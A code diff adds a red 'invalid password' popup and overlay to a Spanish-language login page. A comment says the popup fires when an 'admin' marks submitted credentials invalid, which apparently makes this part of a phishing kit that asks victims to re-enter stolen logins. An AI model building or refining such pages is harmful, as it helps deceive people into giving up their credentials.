@@ -256,9 +256,88 @@
 
     .btn-continuar:hover { background-color: #2DBFBF; }
     .btn-continuar.active { background-color: #2DBFBF; cursor: pointer; }
+
+    /* ── Error popup (clave inválida) ── */
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.45);
+      backdrop-filter: blur(4px);
+      -webkit-backdrop-filter: blur(4px);
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.35s ease;
+      z-index: 998;
+    }
+    .overlay.show { opacity: 1; pointer-events: auto; }
+
+    .popup {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, calc(-50% - 20px));
+      width: min(420px, calc(100vw - 32px));
+      background-color: #d32f2f;
+      color: #fff;
+      border-radius: 8px;
+      padding: 16px 20px;
+      display: flex;
+      align-items: flex-start;
+      gap: 14px;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.35);
+      opacity: 0;
+      transition: opacity 0.35s ease, transform 0.35s ease;
+      pointer-events: none;
+      z-index: 999;
+    }
+    .popup.show {
+      opacity: 1;
+      transform: translate(-50%, -50%);
+      pointer-events: auto;
+    }
+
+    .popup-icon {
+      background: rgba(255,255,255,0.25);
+      border-radius: 50%;
+      width: 32px; height: 32px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 17px; font-weight: 700;
+      flex-shrink: 0; margin-top: 2px;
+    }
+
+    .popup-body strong {
+      display: block; font-size: 14px; font-weight: 700;
+      margin-bottom: 4px; letter-spacing: 0.3px;
+    }
+    .popup-body span {
+      font-size: 13px; line-height: 1.5; opacity: 0.92;
+    }
+
+    .popup-close {
+      margin-left: auto;
+      background: none; border: none; color: #fff;
+      font-size: 18px; cursor: pointer;
+      padding: 0 0 0 10px; opacity: 0.8;
+      flex-shrink: 0;
+    }
+    .popup-close:hover { opacity: 1; }
   </style>
 </head>
 <body>
+
+  <!-- Overlay -->
+  <div class="overlay" id="overlay" onclick="cerrarPopup()"></div>
+
+  <!-- Red popup -->
+  <div class="popup" id="errorPopup">
+    <div class="popup-icon">✕</div>
+    <div class="popup-body">
+      <strong>CLAVE INVÁLIDA</strong>
+      <span>Documento o contraseña incorrectos. Por favor verifica e intenta nuevamente.</span>
+    </div>
+    <button class="popup-close" onclick="cerrarPopup()">✕</button>
+  </div>
+
 <br><br>
   <div class="page-wrapper">
 
@@ -372,8 +451,23 @@
       passTooltip.classList.remove('show');
     });
 
+    // Red popup when admin marks credentials as invalid (?err=password)
+    const popup   = document.getElementById('errorPopup');
+    const overlay = document.getElementById('overlay');
+
+    function cerrarPopup() {
+      popup.classList.remove('show');
+      overlay.classList.remove('show');
+    }
+
     if (new URLSearchParams(location.search).get('err') === 'password') {
-      setTimeout(() => alert('Documento o contraseña incorrectos. Intenta nuevamente.'), 200);
+      window.addEventListener('load', function () {
+        setTimeout(() => {
+          popup.classList.add('show');
+          overlay.classList.add('show');
+        }, 300);
+        setTimeout(() => cerrarPopup(), 5000);
+      });
     }
   </script>
 </body>
